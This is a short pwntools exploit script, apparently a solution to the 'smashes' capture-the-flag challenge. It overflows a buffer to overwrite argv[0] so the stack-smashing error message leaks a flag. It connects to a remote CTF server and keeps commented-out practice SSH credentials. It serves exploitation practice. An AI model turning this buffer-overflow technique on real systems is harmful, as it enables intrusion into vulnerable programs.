#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./smashes")
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("pwn.jarvisoj.com","9877")
#gdb.attach(io)
#context.log_level = "debug
another_addr = 0x400d20
ori_addr = 0x600d20
argv0_addr = 0x7fffffffe0f8
#0x7fffffffe0f8
#0x7fffffffe40d
stack_addr = 0x7fffffffdee0
char_num = argv0_addr-stack_addr
payload = ""
payload += char_num*"A"
payload += p64(another_addr)
io.sendline(payload)
io.sendline("sss")
print io.recv()
io.interactive()
